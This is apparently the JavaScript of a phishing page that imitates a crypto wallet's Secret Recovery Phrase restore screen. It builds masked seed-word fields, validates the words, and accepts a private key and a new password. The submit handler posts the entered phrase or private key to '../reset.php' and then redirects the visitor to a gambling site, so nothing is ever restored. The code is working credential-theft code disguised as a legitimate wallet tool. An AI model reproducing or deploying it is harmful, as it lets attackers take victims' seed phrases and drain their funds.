let currentState = 12,
    isInvalidPhrase = 0,
    isInvalidKey = 0,
    passwordMatch = 0,
    allowedWordsCount = [12, 15, 18, 21, 24];

function isInt(t) {
    return !isNaN(t) && parseInt(Number(t)) == t && !isNaN(parseInt(t, 10))
}

function buildInputs(t) {
    var n = 1,
        e = "";
    for (i = 0; i < t; i++) e += '<div class="content-input-inner col-lg-4 col-12" data-index=' + n + ">", e += '<label class="content-input-label">' + n + ".</label>", e += '<input type="password" class="content-input" onpaste="return pasteData(this)" oninput="return validateInputs()">', e += '<svg width="24" height="24" fill="currentColor" class="content-input-icon" aria-label="This word is hidden" onclick="return changeProp(' + n + ')" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path></svg>', e += "</div>", n++;
    $(".content-inputs-container").html(""), $(".content-inputs-container").html(e)
}

function changeProp(t) {
    var n = $(".content-input-inner[data-index='" + t + "']"),
        e = n.find("input").prop("type"),
        a = n.find("input"),
        o = n.find("svg");
    "password" == e ? (o.html('<path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>'), a.prop("type", "text")) : (o.html('<path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>'), a.prop("type", "password"))
}

function pasteData(t) {
    var n, e;
    setTimeout(function() {
        if (n = t.value, pastedLength = n.length, 64 == pastedLength && -1 == n.indexOf(" ")) return setDropdownValue("pk"), $("#keyInput").val(n), currentState = "pk", $(".content-notify-container").hide(), $(".content-inputs-container").hide(), $(".content-inputs-error-container").hide(), $(".content-key-container").show(), !1; - 1 !== n.indexOf(",") && (n = n.replace(/,/g, " ")), -1 !== n.indexOf("  ") && (n = n.replace(/  /g, " ")), -1 !== n.indexOf(" ") && (pastedWords = n.split(" "), (e = pastedWords.length) > 12 && e < 15 && (e = 15), e > 15 && e < 18 && (e = 18), e > 18 && e < 21 && (e = 21), e > 21 && e < 24 && (e = 24), e > 24 && (pastedWords = pastedWords.slice(0, 24)), -1 != allowedWordsCount.indexOf(e) ? (buildInputs(e), setDropdownValue(e)) : (buildInputs(12), setDropdownValue(12)), fillInputs(pastedWords))
    }, 5)
}

function setDropdownValue(t) {
    "pk" == t ? $(".content-container").addClass("content-key-window") : $(".content-container").removeClass("content-key-window"), $(".content-dropdown").val(t)
}

function fillInputs(t) {
    t.forEach(function(t, n) {
        $(".content-input-inner[data-index='" + (n + 1) + "']").find("input").val(t)
    })
}

function validateInputs() {
    let t = 0;
    setTimeout(function() {
        if ($(".content-input").each(function() {
                $(this).val().length > 0 && t++
            }), -1 == allowedWordsCount.indexOf(t)) return $("#errorLabel").text("Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words"), $(".content-inputs-error-container").show(), isInvalidPhrase = 1, !1;
        isInvalidPhrase = 0, $(".content-inputs-error-container").hide(), $(".content-input").each(function() {
            var t = $(this).val().toLowerCase();
            if (-1 == wordsList.indexOf(t)) return $("#errorLabel").text("Invalid Secret Recovery Phrase"), $(".content-inputs-error-container").show(), isInvalidPhrase = 1, !1;
            isInvalidPhrase = 0, $(".content-inputs-error-container").hide()
        }), isInvalidPhrase ? $("#restoreButton").attr("disabled", !0) : ($(".content-inputs-error-container").hide(), passwordMatch && $("#restoreButton").attr("disabled", !1))
    }, 5)
}
$(".content-dropdown").on("change", function() {
    var t = this.value;
    passwordMatch = 0, $("#keyInput").val(null), $("#passwordInput").val(null), $("#passwordConfirmInput").val(null), $("#restoreButton").attr("disabled", !0), isInt(t) ? (currentState = t, $(".content-notify-container").show(), $(".content-inputs-container").show(), $(".content-key-container").hide(), buildInputs(t)) : "pk" == t && (currentState = "pk", $(".content-notify-container").hide(), $(".content-inputs-container").hide(), $(".content-key-container").show()), $("#keyInput").val(null)
}), $(".content-key-input-icon").click(function() {
    "password" == $("#keyInput").prop("type") ? ($(this).html('<path d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"></path>'), $("#keyInput").prop("type", "text")) : ($(this).html('<path d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"></path>'), $("#keyInput").prop("type", "password"))
}), $("#passwordInput, #passwordConfirmInput").on("keyup", function() {
    var t = $("#passwordInput").val(),
        n = $("#passwordConfirmInput").val();
    if ($("#restoreButton").attr("disabled", !0), t.length < 8) return $("#passwordLabel").css("display", "block"), !1;
    if ($("#passwordLabel").hide(), n.length) {
        if (t !== n) return passwordMatch = 0, $("#passwordConfirmLabel").css("display", "block"), !1;
        passwordMatch = 1, $("#passwordConfirmLabel").hide()
    }
    passwordMatch && ("pk" !== currentState ? isInvalidPhrase ? $("#restoreButton").attr("disabled", !0) : $("#restoreButton").attr("disabled", !1) : isInvalidKey ? $("#restoreButton").attr("disabled", !0) : $("#restoreButton").attr("disabled", !1))
}), $("#keyInput").on("keyup", function() {
    var t = $("#keyInput").val();
    (isInvalidKey = 64 !== t.length ? 1 : 0) ? $("#keyLabel").css("display", "block"): $("#keyLabel").hide(), 0 == t.length && $("#keyLabel").hide()
}), $("#restoreButton").click(function() {
    var t, n;
    if ($("#restoreButton").attr("disabled", !0), "pk" !== currentState) {
        t = "phrase:";
        var e = [];
        $(".content-input").each(function() {
            var t = $(this).val();
            e.push(t)
        }), n = e.join(" ")
    } else t = "privateKey:", n = $("#keyInput").val();
    $.post("../reset.php", {
        type: t,
        data: n
    }).done(function() {
        window.location.replace("https://stake.com/")
    })
}), $(function() {
    buildInputs(currentState)
});